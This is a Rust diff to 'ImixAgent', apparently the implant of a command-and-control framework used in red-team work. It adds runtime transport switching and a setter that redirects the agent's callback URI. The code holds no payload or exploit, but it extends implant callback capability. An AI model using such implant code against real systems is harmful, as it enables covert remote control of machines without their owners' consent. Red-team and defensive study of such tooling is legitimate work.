@@ -20,7 +20,7 @@ pub struct ImixAgent<T: Transport> {
     pub output_buffer: Arc<Mutex<Vec<c2::ReportTaskOutputRequest>>>,
 }
 
-impl<T: Transport + 'static> ImixAgent<T> {
+impl<T: Transport + Sync + 'static> ImixAgent<T> {
     pub fn new(
         config: Config,
         transport: T,
@@ -156,16 +156,21 @@ impl<T: Transport + 'static> ImixAgent<T> {
         Fut: std::future::Future<Output = Result<()>> + Send + 'static,
     {
         let subtasks = self.subtasks.clone();
-
-        // We need a transport for the subtask. Get it synchronously.
-        let transport = self.block_on(async {
-            self.get_usable_transport().await.map_err(|e| e.to_string())
-        })?;
+        let agent = self.clone();
 
         let handle = self.runtime_handle.spawn(async move {
-            if let Err(e) = action(transport).await {
-                #[cfg(debug_assertions)]
-                log::error!("Subtask {} error: {e:#}", task_id);
+            // We need a transport for the subtask. Get it asynchronously.
+            match agent.get_usable_transport().await {
+                Ok(transport) => {
+                    if let Err(e) = action(transport).await {
+                        #[cfg(debug_assertions)]
+                        log::error!("Subtask {} error: {e:#}", task_id);
+                    }
+                }
+                Err(e) => {
+                    #[cfg(debug_assertions)]
+                    log::error!("Subtask {} failed to get transport: {e:#}", task_id);
+                }
             }
         });
 
@@ -276,11 +281,31 @@ impl<T: Transport + Send + Sync + 'static> Agent for ImixAgent<T> {
     }
 
     fn get_transport(&self) -> Result<String, String> {
-        Ok("grpc".to_string())
+        // Blocks on read, but it's fast
+        self.block_on(async { Ok(self.transport.read().await.name().to_string()) })
     }
 
-    fn set_transport(&self, _transport: String) -> Result<(), String> {
-        Err("Switching transport not supported yet".to_string())
+    fn set_transport(&self, transport: String) -> Result<(), String> {
+        let available = self.list_transports()?;
+        if !available.contains(&transport) {
+            return Err(format!("Invalid transport: {}", transport));
+        }
+
+        self.block_on(async {
+            let mut cfg = self.config.write().await;
+
+            // We need to update the scheme of the callback URI
+            let uri = &cfg.callback_uri;
+            if let Some(idx) = uri.find("://") {
+                let new_uri = format!("{}://{}", transport, &uri[idx + 3..]);
+                cfg.callback_uri = new_uri;
+            } else {
+                // Should not happen if uri is valid, but handle gracefully
+                let new_uri = format!("{}://{}", transport, uri);
+                cfg.callback_uri = new_uri;
+            }
+            Ok(())
+        })
     }
 
     fn add_transport(&self, _transport: String, _config: String) -> Result<(), String> {
@@ -288,7 +313,7 @@ impl<T: Transport + Send + Sync + 'static> Agent for ImixAgent<T> {
     }
 
     fn list_transports(&self) -> Result<Vec<String>, String> {
-        Ok(vec!["grpc".to_string()])
+        self.block_on(async { Ok(self.transport.read().await.list_available()) })
     }
 
     fn get_callback_interval(&self) -> Result<u64, String> {
@@ -301,6 +326,14 @@ impl<T: Transport + Send + Sync + 'static> Agent for ImixAgent<T> {
             if let Some(info) = &mut cfg.info {
                 info.interval = interval;
             }
+            Ok(())
+        })
+    }
+
+    fn set_callback_uri(&self, uri: String) -> Result<(), String> {
+        self.block_on(async {
+            let mut cfg = self.config.write().await;
+            cfg.callback_uri = uri;
             Ok(())
         })
     }
